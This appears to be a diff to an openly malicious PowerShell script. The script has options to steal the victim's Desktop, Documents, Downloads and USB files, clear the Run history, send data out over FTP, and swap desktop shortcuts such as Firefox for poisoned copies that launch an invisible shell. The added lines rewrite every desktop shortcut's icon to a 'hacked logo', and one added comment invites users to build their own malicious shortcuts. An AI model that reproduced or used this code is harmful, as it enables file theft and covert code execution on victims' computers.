@@ -16,7 +16,9 @@ $steal_desktop_folder='yes'
 $steal_documents_folder='yes'
 $steal_downloads_folder='yes'
 
-# Alright let's get to the payload!
+# Hacked shortcut logo section:
+$hacked_shortcut_logo='no'
+
 
 # First we clear the runline history:
 
@@ -46,6 +48,7 @@ If ($steal_files_usb -eq 'yes') {
 # Alright FTP time!
 
 # Real shortcut section
+# Note: if you want to add your own shortcuts, just build your own malicious shortcut as shown in the youtube video in the readme and another block of code like below but with your shortcut.
 
 If ($invisible_shell_launcher -eq 'yes') {
   $poison_file_a="$PSScriptRoot\f o.cmd"
@@ -69,6 +72,40 @@ If (Test-Path "$Env:UserProfile\Desktop\Mozilla Firefox.lnk" -eq True  -AND $inv
   del "C:\Users\Public\Desktop\Mozilla Firefox.lnk"
   robocopy $poisoned_firefox $firefox_lnk /S /MT /Z
 }
+
+
+# Now let's see if you want to give all the shortcuts the hacked logo:
+
+If ($hacked_shortcut_logo -eq 'yes') {
+  # Call wscript com object
+  $shell = new-object -com wscript.shell
+
+  # Recurse through directories for .lnk files
+  dir "C:\Public\Desktop" -filter *.lnk -recurse | foreach {
+    $lnk = $shell.createShortcut($_.fullname)
+    $oldPath= $lnk.targetPath
+    remove-item $_.fullname
+    $lnknew = $shell.createShortcut($_.fullname)
+    $lnknew.targetPath = $oldpath
+    $lnknew.IconLocation = "$PSScriptRoot\hl.ico"
+    $lnknew.Save()
+  }
+  # Call wscript com object
+  $shell = new-object -com wscript.shell
+
+  # Recurse through directories for .lnk files
+  dir "$Env:UserProfile\Desktop" -filter *.lnk -recurse | foreach {
+    $lnk = $shell.createShortcut($_.fullname)
+    $oldPath= $lnk.targetPath
+    remove-item $_.fullname
+    $lnknew = $shell.createShortcut($_.fullname)
+    $lnknew.targetPath = $oldpath
+    $lnknew.IconLocation = "$PSScriptRoot\hl.ico"
+    $lnknew.Save()
+  }
+}
+
+
 
 
 
